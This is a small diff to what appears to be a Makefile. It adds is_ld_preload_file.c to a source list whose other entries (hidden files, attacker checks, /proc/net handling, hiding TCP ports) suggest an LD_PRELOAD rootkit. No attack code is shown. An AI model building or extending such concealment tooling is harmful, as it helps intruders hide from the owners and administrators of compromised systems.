@@ -33,6 +33,7 @@ SOURCES		= src/init.c \
 			  src/config.c \
 			  src/debug.c \
 			  src/is_hidden_file.c \
+			  src/is_ld_preload_file.c \
 			  src/is_attacker.c \
 			  src/is_procnet.c \
 			  src/hide_tcp_ports.c \
